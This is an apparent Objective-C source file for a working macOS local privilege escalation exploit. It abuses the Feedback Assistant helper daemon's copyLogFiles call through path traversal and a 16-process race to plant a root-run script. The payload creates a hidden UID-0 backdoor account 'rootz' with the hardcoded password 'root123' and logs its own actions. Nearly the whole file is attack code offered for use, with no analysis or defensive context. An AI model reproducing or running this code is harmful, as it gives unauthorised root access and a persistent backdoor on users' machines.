#import <Foundation/Foundation.h>

#include <notify.h>
#include <spawn.h>
#include <sys/stat.h>
#include <unistd.h> // For access

#define USR_LOCAL_BIN @"/usr/local/bin"
#define BINARY "/System/Library/CoreServices/Applications/Feedback Assistant.app/Contents/MacOS/Feedback Assistant"

#define MOBILITY_SCRIPT                                                                                                    \
    "/System/Library/Frameworks/SystemConfiguration.framework/Versions/A/Resources/get-mobility-info"
#define NOTIFY_NAME "me.chichou.fbaroot"

#define LOG(fmt, ...) NSLog(@"[LightYear] " fmt "\n", ##__VA_ARGS__)

@protocol FBAPrivilegedDaemon <NSObject>
- (void)copyLogFiles:(NSDictionary *)mapping;
- (void)runMobilityReportWithDestination:(NSURL *)dest;
@end

extern char **environ;

void child(const char *path, int stage) {
    NSDictionary *transformed = [[NSDictionary alloc] initWithContentsOfFile:[NSString stringWithUTF8String:path]];
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.appleseed.fbahelperd"
                                                                                    options:NSXPCConnectionPrivileged];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(FBAPrivilegedDaemon)];
    [connection resume];
    id remote = connection.remoteObjectProxy;
    if (stage == 1) {
        LOG("Child (Stage 1): Calling copyLogFiles with mapping: %@", transformed);
        [remote copyLogFiles:[NSDictionary dictionaryWithDictionary:transformed]];
    } else if (stage == 2) {
        LOG("Child (Stage 2): Calling runMobilityReportWithDestination");
        [remote runMobilityReportWithDestination:[NSURL fileURLWithPath:@"/tmp/whatever.mdsdiagnostic"]];
    }

    char target_binary[] = BINARY;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    int spawn_err = posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
    if (spawn_err != 0) {
        LOG("Child: Error spawning Feedback Assistant: %d", spawn_err);
    } else {
        LOG("Child: Successfully spawned Feedback Assistant (suspended)");
    }
}

NSString *relative(NSString *component) {
    return [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:component];
}

NSMutableDictionary *traversal(NSDictionary *mapping) {
    NSMutableDictionary *transformed = [[NSMutableDictionary alloc] init];
    for (NSString *key in mapping) {
        NSString *val = mapping[key];
        NSString *newKey = [@"/var/log/../../.." stringByAppendingPathComponent:key];
        NSString *newVal = [@"/tmp/../.." stringByAppendingPathComponent:val];
        transformed[newKey] = newVal;
        LOG("Traversal: Mapping '%@' to '%@'", newKey, newVal);
    }
    return transformed;
}

NSDictionary *prepare() {
    NSError *err = nil;
    NSFileManager *mgr = [NSFileManager defaultManager];
    NSString *guid = [[NSProcessInfo processInfo] globallyUniqueString];
    NSString *cwd = [NSTemporaryDirectory() stringByAppendingPathComponent:guid];
    LOG("Prepare: Created temporary directory: %@", cwd);
    [mgr removeItemAtPath:cwd error:nil]; // Ignore error if it doesn't exist

    NSString *fakebin = [cwd stringByAppendingPathComponent:@"bin"];
    if (![mgr createDirectoryAtPath:fakebin withIntermediateDirectories:YES attributes:nil error:&err]) {
        LOG("Prepare: Error creating fakebin directory '%@': %@", fakebin, err);
        return nil;
    }
    LOG("Prepare: Created fakebin directory: %@", fakebin);

    // argument for copyLogFiles:
    NSMutableDictionary *mapping = [[NSMutableDictionary alloc] init];

    // write launcher
    NSString *launcher = [fakebin stringByAppendingPathComponent:@"root.sh"];

#define SHELL_TEMPLATE                                                                                                   \
    @"#!/bin/sh\n"                                                                                                    \
    @"useradd -ou 0 -g 0 rootz\n"                                                                                      \
    @"echo \"rootz:root123\" | chpasswd\n"                                                                            \
    @"echo \"New root user 'rootz' created with password 'root123'\" > /tmp/root_creation_log_$(date +%%s).txt\n"      \
    @"chmod 600 /tmp/root_creation_log_*.txt\n"                                                                        \
    @"%@\n"                                                                                                         \
    @"rm -- \"$0\"\n"

    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSString *sh = [NSString stringWithFormat:SHELL_TEMPLATE, exec];
    if (![sh writeToFile:launcher atomically:NO encoding:NSUTF8StringEncoding error:&err]) {
        LOG("Prepare: Error writing launcher script '%@': %@", launcher, err);
        return nil;
    }
    LOG("Prepare: Wrote launcher script to: %@", launcher);
    // LOG(@"Prepare: Launcher script content:\n%@", sh);

    // find /usr/local/bin/*
    NSString *mobility = [NSString stringWithContentsOfFile:@MOBILITY_SCRIPT encoding:NSUTF8StringEncoding error:&err];
    if (!mobility) {
        LOG("Prepare: Error reading mobility script '%@': %@", MOBILITY_SCRIPT, err);
        return nil;
    }
    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"if \\[ -x /usr/local/bin/(\\w+)"
                                                                     options:NSRegularExpressionCaseInsensitive
                                                                       error:&err];
    if (!regex) {
        LOG("Prepare: Error creating regex: %@", err);
        return nil;
    }
    NSTextCheckingResult *match = [regex firstMatchInString:mobility options:0 range:NSMakeRange(0, [mobility length])];
    if (!match) {
        LOG("Prepare: Fatal error: this exploit may not work on your system - privileged binary not found in mobility script.");
        return nil;
    }

    NSString *privileged = [mobility substringWithRange:[match rangeAtIndex:1]];
    NSString *canary = [USR_LOCAL_BIN stringByAppendingPathComponent:privileged];
    LOG("Prepare: Found privileged binary name: %@", privileged);
    LOG("Prepare: Canary path: %@", canary);

    BOOL isDir = NO;
    BOOL doesBrewExists = [mgr fileExistsAtPath:USR_LOCAL_BIN isDirectory:&isDir];
    LOG("Prepare: Does '%@' exist and is a directory? %d", USR_LOCAL_BIN, doesBrewExists && isDir);
    if (doesBrewExists && isDir) {
        mapping[launcher] = canary;
        LOG("Prepare: Mapping '%@' to '%@'", launcher, canary);
    } else {
        mapping[fakebin] = USR_LOCAL_BIN;
        LOG("Prepare: Mapping '%@' to '%@'", fakebin, USR_LOCAL_BIN);
    }

    NSString *session = [cwd stringByAppendingPathComponent:@"task.plist"];
    NSDictionary *transformed = traversal(mapping);
    if (![transformed writeToFile:session atomically:NO]) {
        LOG("Prepare: Error writing transformed dictionary to session file '%@'", session);
        return nil;
    }
    LOG("Prepare: Wrote transformed dictionary to session file: %@", session);
    // LOG("Prepare: Transformed dictionary: %@", transformed);
    return @{@"session" : session, @"canary" : canary};
}

#define RACE_COUNT 16

#define SPAWN_CHILDREN(stage)                                                                                              \
    for (int i = 0; i < RACE_COUNT; i++) {                                                                                 \
        NSString *stageStr = [NSString stringWithFormat:@"%d", stage];                                                    \
        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ session, stageStr ]];                         \
        LOG("Exploit: Launched child process %d with session '%@' and stage '%@'", i, session, stageStr);               \
    }

#define TERMINATE_CHILDREN                                                                                                 \
    for (int i = 0; i < RACE_COUNT; i++) {                                                                                 \
        [processes[i] terminate];                                                                                         \
        LOG("Exploit: Terminated child process %d", i);                                                                  \
    }

int exploit(NSString *session, const char *canary) {
    int status = 0;
    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSTask *processes[RACE_COUNT];

    LOG("Exploit: Now racing with %d children (Stage 1)", RACE_COUNT);
    SPAWN_CHILDREN(1);

    int i = 0;
    struct timespec ts = {
        .tv_sec = 0,
        .tv_nsec = 500 * 1000000,
    };

    while (access([canary UTF8String], F_OK) == -1) {
        nanosleep(&ts, NULL);
        if (++i > 4) { // wait for 2 seconds at most
            LOG("Exploit: Stage 1 timed out after 2 seconds, retrying.");
            status = -1;
            goto cleanup;
        }
        LOG("Exploit: Waiting for canary file '%@'...", canary);
    }

    int chmod_result = chmod([canary UTF8String], 0777);
    if (chmod_result == 0) {
        LOG("Exploit: Stage 1 succeeded! Changed permissions of canary file '%@' to 0777", canary);
    } else {
        LOG("Exploit: Stage 1 succeeded in creating canary '%@', but failed to chmod: %d", canary, chmod_result);
    }

    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    int token;
    notify_register_dispatch(NOTIFY_NAME, &token, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
                             ^(int token) {
                                 LOG("Exploit: Notification '%@' received!", NOTIFY_NAME);
                                 dispatch_semaphore_signal(semaphore);
                                 notify_cancel(token);
                             });
    LOG("Exploit: Launched %d children (Stage 2)", RACE_COUNT);
    SPAWN_CHILDREN(2);

    // wait for 2s
    dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 2.0 * NSEC_PER_SEC);
    status = dispatch_semaphore_wait(semaphore, timeout);
    if (status != 0)
        LOG("Exploit: Timed out waiting for notification.");

cleanup:
    TERMINATE_CHILDREN
    return status;
}

int root() {
    notify_post(NOTIFY_NAME);
    LOG("Root: Notification '%@' posted.", NOTIFY_NAME);
    LOG("Root: Effective UID is %d", geteuid());
    NSString *createUserCommand = @"/usr/sbin/useradd -ou 0 -g 0 rootz";
    NSString *setPasswordCommand = @"/usr/bin/yes root123 | /usr/bin/passwd rootz"; // Using 'yes' to pipe password
    NSString *logCreationCommand = @"echo \"Root function executed, attempting user creation.\" >> /tmp/root_actions_$(date +%s).log";
    NSString *logIdCommand = @"id >> /tmp/root_actions_$(date +%s).log";

    NSTask *createUserTask = [[NSTask alloc] init];
    [createUserTask setLaunchPath:@"/bin/sh"];
    [createUserTask setArguments:@[@"-c", createUserCommand]];
    [createUserTask launch];
    [createUserTask waitUntilExit];
    if ([createUserTask terminationStatus] == 0) {
        LOG("Root: Successfully executed useradd command.");
        NSTask *setPasswordTask = [[NSTask alloc] init];
        [setPasswordTask setLaunchPath:@"/bin/sh"];
        [setPasswordTask setArguments:@[@"-c", setPasswordCommand]];
        [setPasswordTask launch];
        [setPasswordTask waitUntilExit];
        if ([setPasswordTask terminationStatus] == 0) {
            LOG("Root: Successfully set password for user 'rootz'.");
        } else {
            LOG("Root: Error setting password for user 'rootz', exit code: %d", [setPasswordTask terminationStatus]);
        }
    } else {
        LOG("Root: Error executing useradd command, exit code: %d", [createUserTask terminationStatus]);
    }

    NSTask *logActionsTask = [[NSTask alloc] init];
    [logActionsTask setLaunchPath:@"/bin/sh"];
    [logActionsTask setArguments:@[@"-c", [NSString stringWithFormat:@"%@ && %@", logCreationCommand, logIdCommand]]];
    [logActionsTask launch];
    [logActionsTask waitUntilExit];

    LOG("Root: bye");
    return 0;
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        LOG("Main: Starting exploit with PID %d and EUID %d", getpid(), geteuid());
        if (geteuid()) {
            LOG("Main: Running as non-root user.");
            if (argc == 3) {
                LOG("Main: Running as child process with session '%s' and stage '%s'", argv[1], argv[2]);
                child(argv[1], atoi(argv[2]));
                return 0;
            }

            NSDictionary *ctx = prepare();
            if (!ctx) {
                LOG("Main: Prepare function failed.");
                return 1;
            }
            LOG("Main: Prepare function completed successfully. Session: %@, Canary: %@", ctx[@"session"], ctx[@"canary"]);

            for (int i = 0; i < 3; i++) {
                LOG("Main: Attempting exploit (try %d)", i + 1);
                if (exploit(ctx[@"session"], [ctx[@"canary"] UTF8String]) == 0) {
                    LOG("Main: Exploit completed successfully.");
                    return 0;
                } else {
                    LOG("Main: Exploit failed on try %d.", i + 1);
                }
            }

            LOG("Main: All tries failed.");
            return 1;
        } else {
            LOG("Main: Running as root user (this should happen after successful exploit).");
            return root();
        }
    }
}